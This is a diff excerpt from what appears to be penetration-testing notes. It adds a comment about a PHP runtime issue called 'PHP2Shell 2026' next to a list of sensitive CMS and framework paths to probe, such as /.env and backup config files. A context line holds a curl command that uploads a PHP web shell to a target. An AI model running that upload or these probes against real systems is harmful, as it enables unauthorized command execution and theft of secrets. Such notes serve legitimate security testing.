@@ -990,6 +990,8 @@ curl -X PUT http://$IP/shell.php -d "&lt;?php system(\$_GET['cmd']); ?&gt;"
 # WordPress:  /wp-login.php /wp-admin /wp-json/wp/v2/users /xmlrpc.php
 # Drupal:     /user/login /node/add /admin/config
 # Joomla:     /administrator /configuration.php.bak
+# WordPress / Joomla / Drupal: PHP2Shell 2026 concerns the PHP RUNTIME,
+# not a CMS version. See section 6.9A for required LFI/session/deserialization gates.
 # Laravel:    /.env /storage/logs/laravel.log
 # Rails:      /rails/info/properties /rails/info/routes
 # Django:     /admin /static/admin
